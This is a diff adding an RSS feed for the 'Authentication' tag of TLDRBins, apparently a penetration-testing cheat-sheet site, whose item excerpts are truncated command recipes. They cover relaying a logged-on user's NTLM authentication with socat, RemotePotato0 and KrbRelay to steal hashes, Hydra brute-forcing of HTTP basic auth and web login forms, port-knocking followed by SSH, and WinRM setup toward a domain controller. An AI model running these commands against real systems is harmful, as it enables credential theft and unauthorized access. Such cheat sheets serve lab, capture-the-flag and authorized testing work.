@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Authentication on TLDRBins</title>
+    <link>https://tldrbins.github.io/@authentication/</link>
+    <description>Recent content in Authentication on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@authentication/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Cross Session Relay</title>
+      <link>https://tldrbins.github.io/cross_session_relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
+      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; 2. Trigger auth request .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x &amp;lt;LOCAL_IP&amp;gt; -p &amp;lt;RELAY_PORT&amp;gt; Ref: RemotePotato0&#xA;1. All-in-one .\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.</description>
+    </item>
+    <item>
+      <title>Hydra</title>
+      <link>https://tldrbins.github.io/hydra/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/hydra/</guid>
+      <description>HTTP basic auth hydra -L &amp;lt;USERS_FILE&amp;gt; -P &amp;lt;PASSWORD_FILE&amp;gt; -s &amp;lt;TARGET_PORT&amp;gt; -f &amp;lt;TARGET&amp;gt; http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra &amp;lt;TARGET&amp;gt; -l &amp;lt;USER&amp;gt; -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form &amp;#39;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#39; +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.</description>
+    </item>
+    <item>
+      <title>Port Knocking</title>
+      <link>https://tldrbins.github.io/port_knocking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/port_knocking/</guid>
+      <description>knockd config location # Find knock sequence cat /etc/knockd.conf TCP UDP # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i &amp;lt;TARGET&amp;gt; &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i &amp;lt;TARGET&amp;gt; &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+    </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
+  </channel>
+</rss>
